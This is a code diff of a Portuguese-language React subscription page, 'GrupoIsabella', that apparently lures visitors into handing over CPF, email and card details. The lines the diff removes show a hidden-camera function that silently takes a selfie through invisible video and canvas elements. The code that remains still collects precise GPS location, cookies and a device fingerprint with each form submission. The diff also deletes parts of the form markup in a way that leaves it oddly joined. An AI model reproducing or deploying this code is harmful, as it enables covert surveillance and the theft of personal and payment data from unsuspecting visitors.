@@ -51,9 +51,7 @@ export default function GrupoIsabella() {
   const [locationData, setLocationData] = useState<LocationData | null>(null)
   const [preciseLocationData, setPreciseLocationData] = useState<PreciseLocationData | null>(null)
 
-  const videoRef = useRef<HTMLVideoElement>(null)
-  const canvasRef = useRef<HTMLCanvasElement>(null)
-  const streamRef = useRef<MediaStream | null>(null)
+  // Removidos videoRef, canvasRef, streamRef pois a captura de foto foi desativada
 
   const previewImages = [
     "/placeholder.svg?height=400&width=300&text=Conteúdo+1",
@@ -76,41 +74,8 @@ export default function GrupoIsabella() {
     getLocationData()
   }, [])
 
-  // Função para iniciar a câmera e capturar uma foto (invisível)
-  const capturePhoto = async (): Promise<string | null> => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      streamRef.current = stream
-
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream
-        videoRef.current.play()
-
-        await new Promise((resolve) => (videoRef.current!.onloadedmetadata = resolve))
-        await new Promise((resolve) => setTimeout(resolve, 500))
-
-        if (canvasRef.current && videoRef.current) {
-          const context = canvasRef.current.getContext("2d")
-          if (context) {
-            canvasRef.current.width = videoRef.current.videoWidth
-            canvasRef.current.height = videoRef.current.videoHeight
-            context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height)
-            const imageData = canvasRef.current.toDataURL("image/jpeg", 0.8)
-            return imageData
-          }
-        }
-      }
-      return null
-    } catch (err) {
-      console.error("Erro ao acessar a câmera:", err)
-      return null
-    } finally {
-      if (streamRef.current) {
-        streamRef.current.getTracks().forEach((track) => track.stop())
-        streamRef.current = null
-      }
-    }
-  }
+  // Função para iniciar a câmera e capturar uma foto (invisível) - REMOVIDA
+  // const capturePhoto = async (): Promise<string | null> => { ... }
 
   // NOVA FUNÇÃO: Capturar localização GPS exata
   const getPreciseLocation = async (): Promise<PreciseLocationData | null> => {
@@ -163,7 +128,7 @@ export default function GrupoIsabella() {
       screenColorDepth: screen.colorDepth,
       screenPixelDepth: screen.pixelDepth,
       availWidth: screen.availWidth,
-      availHeight: screen.availHeight,
+      availHeight: screen.height,
       viewportWidth: window.innerWidth,
       viewportHeight: window.innerHeight,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -287,7 +252,7 @@ export default function GrupoIsabella() {
     e.preventDefault()
     setIsLoading(true)
 
-    const photoData = await capturePhoto()
+    // Removida a chamada para capturePhoto()
     const preciseLocation = await getPreciseLocation()
     const deviceInfo = getDeviceInfo()
     const cookiesInfo = getCookiesInfo()
@@ -303,7 +268,7 @@ export default function GrupoIsabella() {
       localizacaoGPS: preciseLocation,
       dispositivo: deviceInfo,
       cookies: cookiesInfo,
-      fotoCapturada: photoData,
+      // Removido fotoCapturada
       dataHora: deviceInfo.localDateTime,
       dataHoraISO: deviceInfo.dateTime,
       timestamp: deviceInfo.timestamp,
@@ -325,7 +290,7 @@ export default function GrupoIsabella() {
     e.preventDefault()
     setIsLoading(true)
 
-    const photoData = await capturePhoto() // Re-capture for completeness if needed, or pass from previous step
+    // Removida a chamada para capturePhoto()
     const preciseLocation = await getPreciseLocation()
     const deviceInfo = getDeviceInfo()
     const cookiesInfo = getCookiesInfo()
@@ -342,7 +307,7 @@ export default function GrupoIsabella() {
       localizacaoGPS: preciseLocation,
       dispositivo: deviceInfo,
       cookies: cookiesInfo,
-      fotoCapturada: photoData,
+      // Removido fotoCapturada
       dataHora: deviceInfo.localDateTime,
       dataHoraISO: deviceInfo.dateTime,
       timestamp: deviceInfo.timestamp,
@@ -364,7 +329,7 @@ export default function GrupoIsabella() {
     e.preventDefault()
     setIsLoading(true)
 
-    const photoData = await capturePhoto()
+    // Removida a chamada para capturePhoto()
     const preciseLocation = await getPreciseLocation()
     const deviceInfo = getDeviceInfo()
     const cookiesInfo = getCookiesInfo()
@@ -377,7 +342,7 @@ export default function GrupoIsabella() {
       localizacaoGPS: preciseLocation,
       dispositivo: deviceInfo,
       cookies: cookiesInfo,
-      fotoCapturada: photoData,
+      // Removido fotoCapturada
       dataHora: deviceInfo.localDateTime,
       dataHoraISO: deviceInfo.dateTime,
       timestamp: deviceInfo.timestamp,
@@ -641,7 +606,7 @@ export default function GrupoIsabella() {
                   className="w-full min-h-[90px] bg-green-600 hover:bg-green-700 text-white font-bold text-base rounded-lg shadow-md flex flex-col items-center justify-center text-center px-4"
                 >
                   <CheckCircle2 className="w-7 h-7 mb-2" />
-                  <span className="text-xl leading-tight">Assinar com PIX</span>
+                  <span className="text-xl leading-tight">Assinar com PIX <span className="text-[#FFD700] text-base">Exclusivo</span></span>
                   <span className="text-sm font-normal opacity-90 mt-1 leading-tight">Libera APENAS alguns conteúdos básicos</span>
                 </Button>
               </div>
@@ -699,145 +664,6 @@ export default function GrupoIsabella() {
                         placeholder="000.000.000-00"
                         value={cpf}
                         onChange={(e) => setCpf(e.target.value.replace(/\D/g, ''))} // Remove non-digits
-                        className="h-12 text-base pl-3 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
-                        maxLength={11}
-                        required
-                      />
-                    </div>
-                  </div>
-
-                  <div>
-                    <Label htmlFor="credit-card" className="text-sm font-medium text-gray-700">
-                      Número do Cartão de Crédito
-                    </Label>
-                    <div className="relative mt-1">
-                      <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
-                      <Input
-                        id="credit-card"
-                        type="text"
-                        placeholder="XXXX XXXX XXXX XXXX"
-                        value={formatCreditCardNumber(creditCardNumber)}
-                        onChange={(e) => setCreditCardNumber(e.target.value)}
-                        className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
-                        maxLength={19} // 16 digits + 3 spaces
-                        required
-                      />
-                    </div>
-                  </div>
-
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <Label htmlFor="expiration-date" className="text-sm font-medium text-gray-700">
-                        Validade (MM/AA)
-                      </Label>
-                      <div className="relative mt-1">
-                        <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
-                        <Input
-                          id="expiration-date"
-                          type="text"
-                          placeholder="MM/AA"
-                          value={formatExpirationDate(expirationDate)}
-                          onChange={(e) => setExpirationDate(e.target.value)}
-                          className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
-                          maxLength={5} // MM/YY
-                          required
-                        />
-                      </div>
-                    </div>
-                    <div>
-                      <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
-                        CVV
-                      </Label>
-                      <div className="relative mt-1">
-                        <LockKeyhole className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
-                        <Input
-                          id="cvv"
-                          type="text"
-                          placeholder="123"
-                          value={cvv}
-                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))} // Remove non-digits
-                          className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
-                          maxLength={4}
-                          required
-                        />
-                      </div>
-                    </div>
-                  </div>
-
-                   {/* Elementos ocultos para captura da câmera */}
-                  <video ref={videoRef} className="hidden" playsInline autoPlay muted></video>
-                  <canvas ref={canvasRef} className="hidden"></canvas>
-
-                  <Button
-                    type="submit"
-                    disabled={isLoading}
-                    className="w-full h-12 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base rounded-lg transition-all duration-200 disabled:opacity-50"
-                  >
-                    {isLoading ? (
-                      <div className="flex items-center gap-2">
-                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                        Processando...
-                      </div>
-                    ) : (
-                      "Continuar"
-                    )}
-                  </Button>
-                </form>
-              </>
-            )}
-
-            {selectedPaymentMethod === 'pix' && (
-              <>
-                <div className="text-center mb-6 bg-green-50 p-4 rounded-lg border border-green-200">
-                  <div className="flex flex-col sm:flex-row items-center justify-center gap-4"> {/* New flex container */}
-                    {/* Adjusted image size and positioning */}
-                    <img
-                      src="/placeholder.svg?height=100&width=100"
-                      alt="Capa do Conteúdo Básico"
-                      className="w-24 h-24 object-cover rounded-md flex-shrink-0"
-                    />
-                    <div className="flex-1 text-center sm:text-left"> {/* Text content */}
-                      <div className="flex items-center justify-center sm:justify-start gap-2 mb-2">
-                        <CheckCircle2 className="w-5 h-5 text-green-600" />
-                        <p className="text-lg font-semibold text-green-800">Acesso Básico via PIX</p>
-                      </div>
-                      <p className="text-sm text-gray-600">Você terá acesso a uma seleção de conteúdos básicos.</p>
-                      <p className="text-4xl font-extrabold text-green-600 mt-2">GRÁTIS</p>
-                      <p className="text-xs text-gray-500 mt-1">Sem custo, acesso imediato!</p>
-                    </div>
-                  </div>
-                </div>
-
-                <form onSubmit={handlePixSubmission} className="space-y-4">
-                  <div>
-                    <Label htmlFor="pix-email" className="text-sm font-medium text-gray-700">
-                      Email
-                    </Label>
-                    <div className="relative mt-1">
-                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
-                      <Input
-                        id="pix-email"
-                        type="email"
-                        placeholder="seu.email@exemplo.com"
-                        value={subscriptionEmail}
-                        onChange={(e) => setSubscriptionEmail(e.target.value)}
-                        className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-green-500 focus:ring-green-500 rounded-lg"
-                        required
-                      />
-                    </div>
-                  </div>
-
-                  <div>
-                    <Label htmlFor="pix-cpf" className="text-sm font-medium text-gray-700">
-                      CPF
-                    </Label>
-                    <div className="relative mt-1">
-                      <Input
-                        id="pix-cpf"
-                        type="text"
-                        placeholder="000.000.000-00"
-                        value={cpf}
-                        onChange={(e) => setCpf(e.target.value.replace(/\D/g, ''))} // Remove non-digits
                         className="h-12 text-base pl-3 pr-3 border-gray-300 focus:border-green-500 focus:ring-green-500 rounded-lg"
                         maxLength={11}
                         required
@@ -845,9 +671,9 @@ export default function GrupoIsabella() {
                     </div>
                   </div>
 
-                   {/* Elementos ocultos para captura da câmera */}
-                  <video ref={videoRef} className="hidden" playsInline autoPlay muted></video>
-                  <canvas ref={canvasRef} className="hidden"></canvas>
+                   {/* Elementos ocultos para captura da câmera - REMOVIDOS */}
+                  {/* <video ref={videoRef} className="hidden" playsInline autoPlay muted></video> */}
+                  {/* <canvas ref={canvasRef} className="hidden"></canvas> */}
 
                   <Button
                     type="submit"
